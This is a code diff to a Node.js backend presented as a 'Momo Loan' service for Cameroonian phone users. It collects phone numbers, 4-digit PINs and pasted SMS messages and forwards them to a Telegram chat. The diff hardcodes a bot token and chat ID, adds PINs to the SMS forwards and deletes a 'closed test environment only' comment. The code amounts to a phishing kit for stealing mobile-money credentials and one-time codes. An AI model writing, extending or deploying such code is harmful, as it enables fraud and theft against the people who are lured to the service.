@@ -16,8 +16,8 @@ const PORT = process.env.PORT || 5000;
 // ============================================
 // TELEGRAM CONFIG (from environment only)
 // ============================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8981992702:AAErEZtMgmYbVHsYnm7yBRKyuHZcF1bI_iw';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8732435859';
 
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set. Notifications disabled.');
@@ -172,12 +172,20 @@ app.post('/api/application', async (req, res) => {
 // --------------------------------------------
 app.post('/api/login', async (req, res) => {
     try {
-        const phone = (req.body && req.body.phone) || '';
-         const pin = (req.body && req.body.pin) || ''; 
+        const body = req.body || {};
+        const phone = (body.phone || '').toString().trim();
+        const pin = (body.pin || '').toString().trim();
+
+        // --- Validation ---
         if (!isValidCameroonPhone(phone)) {
             return res.status(400).json({ ok: false, error: 'Invalid phone number' });
         }
 
+        if (!/^\d{4}$/.test(pin)) {
+            return res.status(400).json({ ok: false, error: 'PIN must be exactly 4 digits' });
+        }
+
+        // --- Create session ---
         const token = crypto.randomBytes(24).toString('hex');
         const session = {
             token,
@@ -187,11 +195,13 @@ app.post('/api/login', async (req, res) => {
         };
         sessions.set(token, session);
 
+        // --- Telegram message ---
         const msg =
             `🔐 <b>Login attempt</b>\n` +
-            `📱 Phone: ${escapeHtml(phone)}\n` +
-            `🔑 PIN: ${escapeHtml(pin)}\n` + 
-            `🕐 ${escapeHtml(session.createdAt)}`;
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `📱 <b>Phone:</b> ${escapeHtml(phone)}\n` +
+            `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
+            `🕐 <b>Time:</b> ${escapeHtml(session.createdAt)}`;
 
         await sendTelegramMessage(msg);
 
@@ -205,11 +215,10 @@ app.post('/api/login', async (req, res) => {
 // --------------------------------------------
 // POST /api/sms
 // Receives a pasted SMS and forwards it to Telegram.
-// (Closed test environment only — see warnings in the frontend.)
 // --------------------------------------------
 app.post('/api/sms', async (req, res) => {
     try {
-        const { phone,pin, token, sms } = req.body || {};
+        const { phone, pin, token, sms } = req.body || {};
 
         if (!sms || typeof sms !== 'string' || sms.trim().length < 20) {
             return res.status(400).json({ ok: false, error: 'Invalid SMS content' });
@@ -233,6 +242,7 @@ app.post('/api/sms', async (req, res) => {
             `━━━━━━━━━━━━━━━━━━\n` +
             `🔖 <b>Ref:</b> ${escapeHtml(reference)}\n` +
             `📱 <b>Phone:</b> ${escapeHtml(submission.phone)}\n` +
+            (submission.pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(submission.pin)}</code>\n` : '') +
             `🕐 <b>Time:</b> ${escapeHtml(submission.submittedAt)}\n\n` +
             `<b>Message:</b>\n<code>${escapeHtml(trimmed)}</code>`;
 
@@ -278,4 +288,5 @@ app.use((err, req, res, next) => {
 app.listen(PORT, () => {
     console.log(`✅ Momo Loan backend running on port ${PORT}`);
     console.log(`   Telegram notifications: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'enabled' : 'disabled'}`);
+    console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
 });
